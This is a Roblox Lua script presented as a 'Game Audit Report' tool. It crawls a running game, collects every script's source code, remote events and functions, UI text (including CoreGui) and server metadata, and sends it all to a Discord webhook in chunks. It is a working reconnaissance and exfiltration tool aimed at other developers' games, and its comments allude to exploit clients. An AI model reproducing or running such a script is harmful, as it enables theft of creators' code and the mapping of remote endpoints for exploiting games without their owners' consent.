-- ===== UTILITY FUNCTIONS =====
local http = game:GetService("HttpService")

local function httpPost(url, data)
    local success, response = pcall(function()
        return http:PostAsync(url, http:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
    return success and response or nil
end

local function getTableSize(t)
    local count = 0
    for _ in pairs(t or {}) do count = count + 1 end
    return count
end

local function sanitizeText(text)
    if type(text) ~= "string" then text = tostring(text) end
    -- Escape Discord markdown characters
    return text:gsub("`", "\\`"):gsub("*", "\\*"):gsub("_", "\\_"):gsub("~", "\\~"):gsub("|", "\\|")
end

-- ===== EXTRACTION FUNCTIONS =====
local function getAllConsoleCommands()
    local commands = {}
    -- ConsoleService is NOT available in normal Roblox clients (only Studio or some exploits)
    -- We'll safely attempt to access it, but it will likely be nil.
    local success, consoleService = pcall(function()
        return game:GetService("ConsoleService")
    end)
    
    if success and consoleService and consoleService.GetCommands then
        local cmdList = consoleService:GetCommands()
        if cmdList then
            for _, cmd in pairs(cmdList) do
                table.insert(commands, {
                    Name = tostring(cmd.Name or "Unknown"),
                    Description = tostring(cmd.Description or ""),
                    Filter = tostring(cmd.Filter or "")
                })
            end
        end
    end
    return commands
end

local function getAllScripts(parent, results)
    results = results or {}
    for _, child in pairs(parent:GetChildren()) do
        if child:IsA("LuaSourceContainer") then
            local source = "[Binary/Compiled or Protected]"
            pcall(function()
                source = child.Source
            end)
            table.insert(results, {
                ClassName = child.ClassName,
                Name = child.Name,
                Source = source,
                Path = child:GetFullName()
            })
        end
        getAllScripts(child, results)
    end
    return results
end

local function getRemoteEvents()
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, {
                Name = obj.Name,
                ClassName = obj.ClassName,
                Parent = obj.Parent and obj.Parent:GetFullName() or "nil"
            })
        end
    end
    return remotes
end

local function getGameMetadata()
    local marketplaceService = game:GetService("MarketplaceService")
    local productInfo = nil
    pcall(function()
        productInfo = marketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
    end)

    return {
        GameName = (productInfo and productInfo.Name) or "Unknown Game",
        PlaceId = game.PlaceId,
        JobId = game.JobId,
        CreatorId = game.CreatorId,
        CreatorType = tostring(game.CreatorType),
        IsStudio = game:GetService("RunService"):IsStudio(),
        GameId = game.GameId
    }
end

local function getUIElements()
    local uiElements = {}
    local servicesToScan = {
        game:GetService("CoreGui"),
        game:GetService("PlayerGui")
    }

    for _, service in pairs(servicesToScan) do
        if service then
            for _, element in pairs(service:GetDescendants()) do
                if element:IsA("TextButton") or element:IsA("TextLabel") or element:IsA("ImageButton") or element:IsA("TextBox") then
                    table.insert(uiElements, {
                        ClassName = element.ClassName,
                        Name = element.Name,
                        Text = (element.Text and sanitizeText(element.Text)) or "[No Text]",
                        Size = tostring(element.Size),
                        Position = tostring(element.Position),
                        Path = element:GetFullName()
                    })
                end
            end
        end
    end
    return uiElements
end

-- ===== PACKAGE DATA =====
local function packageData()
    local scripts = getAllScripts(game)
    local remotes = getRemoteEvents()
    local ui = getUIElements()
    local commands = getAllConsoleCommands()
    
    local data = {
        timestamp = os.time(),
        gameMetadata = getGameMetadata(),
        consoleCommands = commands,
        allScripts = scripts,
        remoteEvents = remotes,
        uiElements = ui,
        stats = {
            totalScripts = #scripts,
            totalRemotes = #remotes,
            totalCommands = #commands,
            totalUIElements = #ui,
            totalDataSize = 0
        }
    }
    
    -- Calculate JSON size safely
    local encoded = http:JSONEncode(data)
    data.stats.totalDataSize = #encoded
    return data
end

-- ===== DISCORD WEBHOOK =====
local function sendToDiscord(data)
    -- Build embed summary
    local payload = {
        content = "**[ROBLOX GAME AUDIT REPORT]**",
        embeds = {{
            title = "Game Audit Report",
            description = string.format(
                "**Game:** %s\n**Place ID:** %d\n**Job ID:** %s\n**Timestamp:** <t:%d:F>",
                sanitizeText(data.gameMetadata.GameName),
                data.gameMetadata.PlaceId,
                data.gameMetadata.JobId,
                data.timestamp
            ),
            fields = {
                { name = "📜 Scripts Found", value = tostring(data.stats.totalScripts), inline = true },
                { name = "📡 RemoteEvents/Functions", value = tostring(data.stats.totalRemotes), inline = true },
                { name = "🖥️ UI Elements", value = tostring(data.stats.totalUIElements), inline = true },
                { name = "⌨️ Console Commands", value = tostring(data.stats.totalCommands), inline = true },
                { name = "💾 Data Size (Bytes)", value = tostring(data.stats.totalDataSize), inline = true }
            },
            color = 0x00FF00,
            footer = { text = "Roblox Game Audit" }
        }}
    }

    -- Send summary embed
    local response = httpPost(WEBHOOK_URL, payload)
    if not response then
        warn("[ERROR] Failed to send summary to Discord. Check webhook URL.")
        return
    end
    print("[OK] Summary sent.")
    
    -- Prepare detailed messages (split to avoid Discord's 2000 char limit)
    local detailedContent = {}
    local currentMessage = "```lua\n-- === FULL AUDIT DATA ===\n"
    
    -- Helper to add content with splitting
    local function addToMessage(str)
        if #currentMessage + #str > 1990 then
            table.insert(detailedContent, currentMessage .. "```")
            currentMessage = "```lua\n" .. str
        else
            currentMessage = currentMessage .. str
        end
    end
    
    -- Game metadata
    addToMessage(string.format("-- Game Metadata:\n%s\n\n", http:JSONEncode(data.gameMetadata)))
    
    -- Scripts
    addToMessage(string.format("-- Scripts (%d):\n", data.stats.totalScripts))
    for i, script in ipairs(data.allScripts) do
        local snippet = string.format(
            "[%d] %s (%s)\n Path: %s\n Source (first 300 chars):\n%s%s\n\n",
            i,
            sanitizeText(script.Name),
            script.ClassName,
            sanitizeText(script.Path),
            sanitizeText(string.sub(script.Source, 1, 300)),
            (#script.Source > 300 and "..." or "")
        )
        addToMessage(snippet)
    end
    
    -- Remote Events
    addToMessage(string.format("-- Remote Events & Functions (%d):\n", data.stats.totalRemotes))
    for i, remote in ipairs(data.remoteEvents) do
        addToMessage(string.format("[%d] %s (%s)\n Path: %s\n\n", i, sanitizeText(remote.Name), remote.ClassName, sanitizeText(remote.Parent)))
    end
    
    -- UI Elements
    addToMessage(string.format("-- UI Elements (%d):\n", data.stats.totalUIElements))
    for i, ui in ipairs(data.uiElements) do
        addToMessage(string.format("[%d] %s (%s)\n Path: %s\n Text: %s\n\n", i, sanitizeText(ui.Name), ui.ClassName, sanitizeText(ui.Path), sanitizeText(ui.Text)))
    end
    
    -- Console Commands (if any)
    if data.stats.totalCommands > 0 then
        addToMessage(string.format("-- Console Commands (%d):\n", data.stats.totalCommands))
        for i, cmd in ipairs(data.consoleCommands) do
            addToMessage(string.format("[%d] %s\n Description: %s\n\n", i, sanitizeText(cmd.Name), sanitizeText(cmd.Description)))
        end
    else
        addToMessage("-- No console commands accessible.\n")
    end
    
    -- Finalize last message
    table.insert(detailedContent, currentMessage .. "```")
    
    -- Send detailed parts
    for idx, msg in ipairs(detailedContent) do
        local detailPayload = { content = msg }
        local ok = httpPost(WEBHOOK_URL, detailPayload)
        if not ok then
            warn(string.format("[ERROR] Failed to send detailed part %d", idx))
        else
            print(string.format("[OK] Detailed part %d sent", idx))
        end
        task.wait(0.6) -- rate limit
    end
    
    print("[SUCCESS] Full audit sent to Discord!")
end

